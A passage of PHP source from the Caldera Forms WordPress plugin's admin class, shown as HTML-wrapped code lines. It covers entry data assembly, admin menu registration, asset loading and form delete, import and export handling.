Caldera_Forms_Fields::get_all();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                foreach ( $ids as $entry_id ) {&nbsp;</div></li><li><div>                    $rows = $entries-&gt;get_rows( $page, (int) $entry_id, $status );&nbsp;</div></li><li><div>                    foreach ( $rows as $row ) {&nbsp;</div></li><li><div>                        $e = 'E' . $row-&gt;entry_id;&nbsp;</div></li><li><div>                        if ( ! empty( $row-&gt;_user_id ) ) {&nbsp;</div></li><li><div>                            $user = get_userdata( $row-&gt;_user_id );&nbsp;</div></li><li><div>                            if ( ! empty( $user ) ) {&nbsp;</div></li><li><div>                                $data[ 'entries' ][ $e ][ 'user' ][ 'ID' ]     = $user-&gt;ID;&nbsp;</div></li><li><div>                                $data[ 'entries' ][ $e ][ 'user' ][ 'name' ]   = $user-&gt;data-&gt;display_name;&nbsp;</div></li><li><div>                                $data[ 'entries' ][ $e ][ 'user' ][ 'email' ]  = $user-&gt;data-&gt;user_email;&nbsp;</div></li><li><div>                                $data[ 'entries' ][ $e ][ 'user' ][ 'avatar' ] = get_avatar( $user-&gt;ID, 64 );&nbsp;</div></li><li><div>                            }&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        $data[ 'entries' ][ $e ][ '_entry_id' ] = $row-&gt;entry_id;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        $submitted = $row-&gt;_datestamp;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        $data[ 'entries' ][ $e ][ '_date' ] = Caldera_Forms::localize_time( $submitted );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        // setup default data array&nbsp;</div></li><li><div>                        if ( ! isset( $data[ 'entries' ][ $e ][ 'data' ] ) ) {&nbsp;</div></li><li><div>                            if ( isset( $field_labels ) ) {&nbsp;</div></li><li><div>                                foreach ( $field_labels as $slug =&gt; $label ) {&nbsp;</div></li><li><div>                                    // setup labels ordering&nbsp;</div></li><li><div>                                    $data[ 'entries' ][ $e ][ 'data' ][ $slug ] = null;&nbsp;</div></li><li><div>                                }&nbsp;</div></li><li><div>                            }&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        if ( ! empty( $field_labels[ $row-&gt;slug ] ) ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                            $label = $field_labels[ $row-&gt;slug ];&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                            // check view handler&nbsp;</div></li><li><div>                            $field = Caldera_Forms_Field_Util::get_field(  $row-&gt;slug, $form, true );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                            // maybe json?&nbsp;</div></li><li><div>                            $is_json = json_decode( $row-&gt;value, ARRAY_A );&nbsp;</div></li><li><div>                            if ( ! empty( $is_json ) ) {&nbsp;</div></li><li><div>                                $row-&gt;value = $is_json;&nbsp;</div></li><li><div>                            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        if( is_string( $row-&gt;value ) ) {&nbsp;</div></li><li><div>                            $row-&gt;value = esc_html( stripslashes_deep( $row-&gt;value ) );&nbsp;</div></li><li><div>                        }else{&nbsp;</div></li><li><div>                            $row-&gt;value = stripslashes_deep( Caldera_Forms_Sanitize::sanitize( $row-&gt;value ) );&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                            $row-&gt;value = apply_filters( 'caldera_forms_view_field_' . $field[ 'type' ], $row-&gt;value, $field, $form );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                            if ( isset( $data[ 'entries' ][ $e ][ 'data' ][ $row-&gt;slug ] ) ) {&nbsp;</div></li><li><div>                                // array based - add another entry&nbsp;</div></li><li><div>                                if ( ! is_array( $data[ 'entries' ][ $e ][ 'data' ][ $row-&gt;slug ] ) ) {&nbsp;</div></li><li><div>                                    $tmp = $data[ 'entries' ][ $e ][ 'data' ][ $row-&gt;slug ];&nbsp;</div></li><li><div>                                    $data[ 'entries' ][ $e ][ 'data' ][ $row-&gt;slug ] = array( $tmp );&nbsp;</div></li><li><div>                                }&nbsp;</div></li><li><div>                                $data[ 'entries' ][ $e ][ 'data' ][ $row-&gt;slug ][] = $row-&gt;value;&nbsp;</div></li><li><div>                            } else {&nbsp;</div></li><li><div>                                $data[ 'entries' ][ $e ][ 'data' ][ $row-&gt;slug ] = $row-&gt;value;&nbsp;</div></li><li><div>                            }&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        if ( ! empty( $form[ 'variables' ][ 'types' ] ) ) {&nbsp;</div></li><li><div>                            foreach ( $form[ 'variables' ][ 'types' ] as $var_key =&gt; $var_type ) {&nbsp;</div></li><li><div>                                if ( $var_type == 'entryitem' ) {&nbsp;</div></li><li><div>                                    $data[ 'fields' ][ $form[ 'variables' ][ 'keys' ][ $var_key ] ] = ucwords( str_replace( '_', ' ', $form[ 'variables' ][ 'keys' ][ $var_key ] ) );&nbsp;</div></li><li><div>                                    $data[ 'entries' ][ $e ][ 'data' ][ $form[ 'variables' ][ 'keys' ][ $var_key ] ] = Caldera_Forms::do_magic_tags( $form[ 'variables' ][ 'values' ][ $var_key ], $row-&gt;_entryid );&nbsp;</div></li><li><div>                                }&nbsp;</div></li><li><div>                            }&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                    }&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        return $data;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Return an instance of this class.&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @return    object    A single instance of this class.&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public static function get_instance() {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // If the single instance hasn't been set, set it now.&nbsp;</div></li><li><div>        if ( null == self::$instance ) {&nbsp;</div></li><li><div>            self::$instance = new self;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        return self::$instance;&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Registers the admin page&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public function register_admin_page() {&nbsp;</div></li><li><div>        global $menu, $submenu;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $forms = Caldera_Forms_Forms::get_forms( true );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // get current user&nbsp;</div></li><li><div>        if( current_user_can( Caldera_Forms::get_manage_cap() ) ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            $this-&gt;screen_prefix[] = add_menu_page( __('Caldera Forms', 'caldera-forms' ), __('Caldera Forms', 'caldera-forms' ), Caldera_Forms::get_manage_cap(), $this-&gt;plugin_slug, array( $this, 'render_admin' ), 'dashicons-cf-logo', 52.81321 );&nbsp;</div></li><li><div>            add_submenu_page( $this-&gt;plugin_slug, __('Caldera Forms Admin', 'caldera-forms' ), __('Forms', 'caldera-forms' ), Caldera_Forms::get_manage_cap(), $this-&gt;plugin_slug, array( $this, 'render_admin' ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            if( ! empty( $forms ) ) {&nbsp;</div></li><li><div>                foreach($forms as $form_id=&gt;$form) {&nbsp;</div></li><li><div>                    if(!empty($form['pinned'])) {&nbsp;</div></li><li><div>                        $this-&gt;screen_prefix[] = add_submenu_page( $this-&gt;plugin_slug, __('Caldera Forms', 'caldera-forms' ).' - ' . $form['name'], '- '.$form['name'], Caldera_Forms::get_manage_cap(), $this-&gt;plugin_slug . '-pin-' . $form_id, array( $this, 'render_admin' ) );&nbsp;</div></li><li><div>                    }&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            $this-&gt;screen_prefix[] = add_submenu_page( $this-&gt;plugin_slug, __('Caldera Forms', 'caldera-forms' ) . ' - ' . __('Extend', 'caldera-forms' ), __('Extend', 'caldera-forms' ), Caldera_Forms::get_manage_cap(), $this-&gt;plugin_slug . '-extend', array( $this, 'render_admin' ) );&nbsp;</div></li><li><div>        }else{&nbsp;</div></li><li><div>            // not an admin - pin for user&nbsp;</div></li><li><div>            if( ! empty( $forms ) ) {&nbsp;</div></li><li><div>                $user = wp_get_current_user();&nbsp;</div></li><li><div>                if(empty($user-&gt;roles)) {&nbsp;</div></li><li><div>                    // no role - bye bye.&nbsp;</div></li><li><div>                    return;&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                foreach($forms as $form_id=&gt;$form) {&nbsp;</div></li><li><div>                    $capability = null;&nbsp;</div></li><li><div>                    if(!empty($form['pinned']) && !empty( $form['pin_roles'] ) ) {&nbsp;</div></li><li><div>                        if( !empty( $form['pin_roles']['all_roles'] ) ) {&nbsp;</div></li><li><div>                            $user = wp_get_current_user();&nbsp;</div></li><li><div>                            if( empty( $user ) || empty( $user-&gt;roles ) ) {&nbsp;</div></li><li><div>                                continue;&nbsp;</div></li><li><div>                            }&nbsp;</div></li><li><div>                            $capabilities = array_keys( $user-&gt;allcaps );&nbsp;</div></li><li><div>                            if( empty( $capabilities ) ) {&nbsp;</div></li><li><div>                                continue;&nbsp;</div></li><li><div>                            }&nbsp;</div></li><li><div>                            $capability = $capabilities[0];&nbsp;</div></li><li><div>                        }elseif( !empty( $form['pin_roles']['access_role'] ) ) {&nbsp;</div></li><li><div>                            foreach ($form['pin_roles']['access_role'] as $role =&gt; $enabled) {&nbsp;</div></li><li><div>                                if( in_array( $role, $user-&gt;roles ) ) {&nbsp;</div></li><li><div>                                    $role_details = get_role( $role );&nbsp;</div></li><li><div>                                    if(empty($role_details-&gt;capabilities)) {&nbsp;</div></li><li><div>                                        continue;&nbsp;</div></li><li><div>                                    }&nbsp;</div></li><li><div>                                    $capabilities = array_keys( $role_details-&gt;capabilities );&nbsp;</div></li><li><div>                                    $capability = $capabilities[0];&nbsp;</div></li><li><div>                                    break;&nbsp;</div></li><li><div>                                }&nbsp;</div></li><li><div>                            }&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>                        if( empty($capability)) {&nbsp;</div></li><li><div>                            // not this one.&nbsp;</div></li><li><div>                            continue;&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        if( empty( $this-&gt;screen_prefix ) ) {&nbsp;</div></li><li><div>                            // make top menu&nbsp;</div></li><li><div>                            $main_slug = $this-&gt;plugin_slug . '-pin-' . $form_id;&nbsp;</div></li><li><div>                            $this-&gt;screen_prefix[] = add_menu_page( __('Caldera Forms', 'caldera-forms' ), __('Caldera Forms', 'caldera-forms' ), $capability, $main_slug, array( $this, 'render_admin' ), 'dashicons-cf-logo', 52.999 );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        $this-&gt;screen_prefix[] = add_submenu_page( $main_slug, __('Caldera Forms', 'caldera-forms' ).' - ' . $form['name'], $form['name'], $capability, $this-&gt;plugin_slug . '-pin-' . $form_id, array( $this, 'render_admin' ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                    }&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Register and enqueue admin-specific style sheet.&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @return    null&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public function enqueue_admin_stylescripts() {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $screen = get_current_screen();&nbsp;</div></li><li><div>        Caldera_Forms_Render_Assets::register();&nbsp;</div></li><li><div>        Caldera_Forms_Admin_Assets::register_scripts();&nbsp;</div></li><li><div>        Caldera_Forms_Admin_Assets::register_styles();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        wp_enqueue_style( $this-&gt;plugin_slug . '-admin-icon-styles', CFCORE_URL . 'assets/css/dashicon.css', array(), self::VERSION );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( $screen-&gt;base === 'post' ) {&nbsp;</div></li><li><div>            Caldera_Forms_Admin_Assets::post_editor();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( ! in_array( $screen-&gt;base, $this-&gt;screen_prefix ) ) {&nbsp;</div></li><li><div>            return;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        add_action( 'admin_head', array( __CLASS__, 'remove_notice_actions' ) );&nbsp;</div></li><li><div>        if( self::is_page( 'caldera-forms-extend' ) ) {&nbsp;</div></li><li><div>            add_action( 'admin_enqueue_scripts', array( 'Caldera_Forms_Admin_Extend', 'scripts' ), 55 );&nbsp;</div></li><li><div>            return;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        Caldera_Forms_Admin_Assets::admin_common();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( Caldera_Forms_Admin::is_edit() ) {&nbsp;</div></li><li><div>            Caldera_Forms_Admin_Assets::form_editor();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        } else {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            Caldera_Forms_Render_Assets::enqueue_all_fields();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            if ( ! empty( $_GET[ 'edit-entry' ] ) ) {&nbsp;</div></li><li><div>                Caldera_Forms_Render_Assets::enqueue_style( 'grid' );&nbsp;</div></li><li><div>            }else{&nbsp;</div></li><li><div>                $clippy = new Caldera_Forms_Admin_Clippy( $this-&gt;plugin_slug, site_url() );&nbsp;</div></li><li><div>                $clippy-&gt;assets();&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        Caldera_Forms_Admin_Assets::panels();&nbsp;</div></li><li><div>        &nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Renders the admin pages&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public function render_admin() {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        echo &quot;    &lt;div class=\&quot;wrap\&quot;&gt;\r\n&quot;;&nbsp;</div></li><li><div>        if(!empty($_GET['edit'])) {&nbsp;</div></li><li><div>            echo &quot;&lt;form method=\&quot;POST\&quot; action=\&quot;admin.php?page=&quot; . $this-&gt;plugin_slug . &quot;\&quot; data-load-element=\&quot;#save_indicator\&quot; data-sender=\&quot;ajax\&quot; class=\&quot;caldera-forms-options-form edit-update-trigger\&quot;&gt;\r\n&quot;;&nbsp;</div></li><li><div>            include CFCORE_PATH . 'ui/edit.php';&nbsp;</div></li><li><div>            echo &quot;&lt;/form&gt;\r\n&quot;;&nbsp;</div></li><li><div>        }elseif(!empty($_GET['page']) && $_GET['page'] == 'caldera-forms-extend') {&nbsp;</div></li><li><div>            include CFCORE_PATH . 'ui/extend.php';&nbsp;</div></li><li><div>        }elseif(!empty($_GET['page']) && false !== strpos($_GET['page'], 'caldera-forms-pin-')) {&nbsp;</div></li><li><div>            $formID = substr($_GET['page'], 18);&nbsp;</div></li><li><div>            $form = Caldera_Forms_Forms::get_form( $formID );&nbsp;</div></li><li><div>            include CFCORE_PATH . 'ui/entries.php';&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        }else{&nbsp;</div></li><li><div>            add_action( 'caldera_forms_admin_footer', array( 'Caldera_Forms_Entry_Viewer', 'print_scripts' ) );&nbsp;</div></li><li><div>            include CFCORE_PATH . 'ui/admin.php';&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>        echo &quot;    &lt;/div&gt;\r\n&quot;;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /***&nbsp;</div></li><li><div>     * Handles form updating, deleting, exporting and importing&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @uses &quot;init&quot; action&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    static function save_form() {&nbsp;</div></li><li><div>        if( ! isset( $_GET[ 'page' ] ) || 'caldera-forms' != $_GET[ 'page' ] ) {&nbsp;</div></li><li><div>            return;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        /// check for form delete&nbsp;</div></li><li><div>        if(!empty($_GET['delete']) && !empty($_GET['cal_del']) && current_user_can( Caldera_Forms::get_manage_cap( 'save' ), strip_tags( $_GET[ 'delete' ] ) ) ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            if ( ! wp_verify_nonce( $_GET['cal_del'], 'cf_del_frm' ) ) {&nbsp;</div></li><li><div>                // This nonce is not valid.&nbsp;</div></li><li><div>                wp_die( __('Sorry, please try again', 'caldera-forms' ), __('Form Delete Error', 'caldera-forms' ) );&nbsp;</div></li><li><div>            }else{&nbsp;</div></li><li><div>                $deleted = Caldera_Forms_Forms::delete_form( strip_tags( $_GET['delete'] ) );&nbsp;</div></li><li><div>                if ( $deleted ) {&nbsp;</div></li><li><div>                    wp_redirect( 'admin.php?page=caldera-forms' );&nbsp;</div></li><li><div>                    exit;&nbsp;</div></li><li><div>                } else {&nbsp;</div></li><li><div>                    wp_die( __('Sorry, please try again', 'caldera-forms' ), __('Form could not be deleted.', 'caldera-forms' ) );&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        /** IMPORT */&nbsp;</div></li><li><div>        if( isset($_POST['cfimporter']) && current_user_can( Caldera_Forms::get_manage_cap( 'import' ) ) ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            if ( check_admin_referer( 'cf-import', 'cfimporter' ) ) {&nbsp;</div></li><li><div>                if ( isset( $_FILES[ 'import_file' ] ) && ! empty( $_FILES[ 'import_file' ][ 'size' ] ) ) {&nbsp;</div></li><li><div>                    $loc = wp_upload_dir();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                    if ( move_uploaded_file( $_FILES[ 'import_file' ][ 'tmp_name' ], $loc[ 'path' ] . '/cf-form-import.json' ) ) {&nbsp;</div></li><li><div>                        $data = json_decode( file_get_contents( $loc[ 'path' ] . '/cf-form-import.json' ), true );&nbsp;</div></li><li><div>                        if( ! is_array( $data ) ) {&nbsp;</div></li><li><div>                            wp_die( esc_html__( 'File is not a valid Caldera Form Import', 'caldera-forms' ) );&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>                        if( ! isset( $_POST[ 'name' ] ) ) {&nbsp;</div></li><li><div>                            wp_die( esc_html__( 'Form must have a name.', 'caldera-forms' ) );&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        $data[ 'name' ] = strip_tags( $_POST[ 'name' ] );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        $new_form_id = Caldera_Forms_Forms::import_form( $data );&nbsp;</div></li><li><div>                        if( is_string( $new_form_id ) ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                            cf_redirect( add_query_arg(array(&nbsp;</div></li><li><div>                                'page' =&gt; 'caldera-forms', &nbsp;</div></li><li><div>                                'edit' =&gt; $new_form_id&nbsp;</div></li><li><div> ), admin_url( 'admin.php' ) ), 302 );&nbsp;</div></li><li><div>                            exit;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        }else{&nbsp;</div></li><li><div>                            wp_die( esc_html__( 'Form could not be imported.', 'caldera-forms' ) );&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                    }&nbsp;</div></li><li><div>                } else {&nbsp;</div></li><li><div>                    wp_die( esc_html__( 'Sorry, File not uploaded.', 'caldera-forms' ), esc_html__( 'Form Import Error', 'caldera-forms' ) );&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            } else {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                wp_die( esc_html__( 'Sorry, please try again', 'caldera-forms' ), esc_html__( 'Form Import Error', 'caldera-forms' ) );&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if(!empty($_GET['export-form']) && current_user_can( Caldera_Forms::get_manage_cap( 'export', strip_tags( $_GET[ 'export-form' ] ) ) )) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            $form = Caldera_Forms_Forms::get_form( $_GET['export-form'] );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            if(empty($form)) {&nbsp;</div></li><li><div>                wp_die( __('Form does not exist.', 'caldera-forms' ) );&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            header(&quot;Pragma: public&quot;);&nbsp;</div></li><li><div>            header(&quot;Expires: 0&quot;);&nbsp;</div></li><li><div>            header(&quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot;);&nbsp;</div></li><li><div>            header(&quot;Cache-Control: private&quot;, false);&nbsp;</div></li><li><div>            if( empty( $_GET['format'] ) || $_GET['format'] != 'php' ) {&nbsp;</div></li><li><div>                header(&quot;Content-Type: application/json&quot;);&nbsp;</div></li><li><div>                header(&quot;Content-Disposition: attachment; filename=\&quot;&quot; . sanitize_file_name( strtolower( $form['name'] ) ) . &quot;-export.json\&quot;;&quot; );&nbsp;</div></li><li><div>                echo json_encode($form);&nbsp;</div></li><li><div>            }else{&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                $form_id = sanitize_key( $_GET['form_id'] );&nbsp;</div></li><li><div>                if( !empty( $_GET['pin_menu'] ) ) {&nbsp;</div></li><li><div>                    $form['pinned'] = 1;&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>                header(&quot;Content-Type: application/php&quot;);&nbsp;</div></li><li><div>                header(&quot;Content-Disposition: attachment; filename=\&quot;&quot; . sanitize_file_name( strtolower( $form_id ) ) . &quot;-include.php\&quot;;&quot; );&nbsp;</div></li><li><div>                echo '&lt;?php' . &quot;\r\n&quot;;&nbsp;</div></li><li><div>                echo &quot;/**\r\n * Caldera Forms - PHP Export \r\n * {$form['name']} \r\n * @version    &quot; . CFCORE_VER . &quot;\r\n * @license   GPL-2.0+\r\n * \r\n */\r\n\r\n\r\n&quot;;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                $structure = &quot;/**\r\n * Filter admin forms to include custom form in admin\r\n *\r\n * @since 1.3.1\r\n *\r\n * @param array \$forms All registered forms\r\n */\r\n&quot;;&nbsp;</div></li><li><div>                $structure .= 'add_filter( &quot;caldera_forms_get_forms&quot;, function( $forms ) {' . &quot;\r\n&quot;;&nbsp;</div></li><li><div>                $structure .= &quot;\t&quot; . '$forms[&quot;' . $form_id . '&quot;] = apply_filters( &quot;caldera_forms_get_form-' . $form_id . '&quot;, array() );' . &quot;\r\n&quot;;&nbsp;</div></li><li><div>                $structure .= &quot;\t&quot; . 'return $forms;' . &quot;\r\n&quot;;&nbsp;</div></li><li><div>                $structure .= &quot;} );\r\n\r\n&quot;;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                $structure .= &quot;/**\r\n * Filter form request to include form structure to be rendered\r\n *\r\n * @since 1.3.1\r\n *\r\n * @param \$form array form structure\r\n */\r\n&quot;;&nbsp;</div></li><li><div>                $structure .= &quot;add_filter( 'caldera_forms_get_form-{$form_id}', function( \$form ) {\r\n return &quot; . var_export( $form, true ) . &quot;;\r\n&quot; . '} );' . &quot;\r\n&quot;;&nbsp;</div></li><li><div>                // cleanups because I'm me&nbsp;</div></li><li><div>                $structure = str_replace( 'array (', 'array(', $structure );&nbsp;</div></li><li><div>                $structure = str_replace( $form['ID'], $form_id, $structure );&nbsp;</div></li><li><div>                // switch field IDs&nbsp;</div></li><li><div>                if( !empty( $_GET['convert_slugs'] ) ) {&nbsp;</div></li><li><div>                    if ( !empty( $form['fields'] ) ) {&nbsp;</div></li><li><div>                        foreach( $form['fields'] as $field_id=&gt;$field ) {&nbsp;</div></li><li><div>                            $structure = str_replace( $field_id, $field['slug'], $structure );&nbsp;</div></li><li><div>                        }&nbsp;</div></li><li><div>                    }&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                echo $structure;&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>            exit;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if(!empty($_GET['export']) && current_user_can( Caldera_Forms::get_manage_cap( 'export', strip_tags( $_GET[ 'export' ] ) ) ) ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            $form = Caldera_Forms_Forms::get_form( $_GET['export'] );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            global $wpdb;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            //build labels&nbsp;</div></li><li><div>            $labels = array();&nbsp;</div></li><li><div>            $structure = array();&nbsp;</div></li><li><div>            $field_types = Caldera_Forms_Fields::get_all();&nbsp;</div></li><li><div>            $headers = array();&nbsp;</div></li><li><div>            if(!empty($form['fields'])) {&nbsp;</div></li><li><div>                $headers['date_submitted'] = 'Submitted';&nbsp;</div></li><li><div>                foreach( Caldera_Forms_Forms::get_fields( $form, true ) as $field_id =&gt; $field ) {&nbsp;</div></li><li><div>                    if(isset($field_types[$field['type']]['capture']) &&  false === $field_types[$field['type']]['capture']) {&nbsp;</div></li><li><div>                        continue;&nbsp;</div></li><li><div>                    }&nbsp;</div></li><li><div>                    $headers[$field['slug']] = $field['label'];&nbsp;</div></li><li><div>                    $structure[$field['slug']] = $field_id;&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>            $filter = null;&nbsp;</div></li><li><div>            // export set - transient&nbsp;</div></li><li><div>            if(!empty($_GET['tid'])) {&nbsp;</div></li><li><div>                $items = Caldera_Forms_Transient::get_transient( $_GET[ 'tid' ] );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                if(!empty($items)) {&nbsp;</div></li><li><div>                    Caldera_Forms_Transient::delete_transient( $_GET[ 'tid' ] );&nbsp;</div></li><li><div>                    $filter = ' AND `entry`.`id` IN (' . implode(', ', $items) . ') ';&nbsp;</div></li><li><div>                }else{&nbsp;</div></li><li><div>                    wp_die( __('Export selection has expired', 'caldera-forms' ) , __('Export Expired', 'caldera-forms' ) );&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            $rawdata = $wpdb-&gt;get_results($wpdb-&gt;prepare(&quot;&nbsp;</div></li><li><div>            SELECT&nbsp;</div></li><li><div>                `entry`.`id` as `_entryid`, &nbsp;</div></li><li><div>                `entry`.`form_id` AS `_form_id`, &nbsp;</div></li><li><div>                `entry`.`datestamp` AS `_date_submitted`, &nbsp;</div></li><li><div>                `entry`.`user_id` AS `_user_id`&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            FROM `&quot; . $wpdb-&gt;prefix .&quot;cf_form_entries` AS `entry`&nbsp;</div></li><li><div>            &nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            WHERE `entry`.`form_id` = %s&nbsp;</div></li><li><div>            &quot; . $filter . &quot;&nbsp;</div></li><li><div>            AND `entry`.`status` = 'active'&nbsp;</div></li><li><div>            ORDER BY `entry`.`datestamp` DESC;&quot;, $_GET['export']));&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            $data = array();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            foreach( $rawdata as $entry) {&nbsp;</div></li><li><div>                $submission = Caldera_Forms::get_entry( $entry-&gt;_entryid, $form);&nbsp;</div></li><li><div>                $data[$entry-&gt;_entryid]['date_submitted'] = $entry-&gt;_date_submitted;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                foreach ($structure as $slug =&gt; $field_id) {&nbsp;</div></li><li><div>                    $data[$entry-&gt;_entryid][$slug] = ( isset( $submission['data'][$field_id]['value'] ) ? $submission['data'][$field_id]['value'] : null );&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            if( empty( $headers ) ) {&nbsp;</div></li><li><div>                wp_die( esc_html__( 'Could not process export. This is most likely due to a problem with the form configuration.', 'caldera-forms' ) );&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>            $encoding = Caldera_Forms_CSV_Util::character_encoding( $form );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            header(&quot;Pragma: 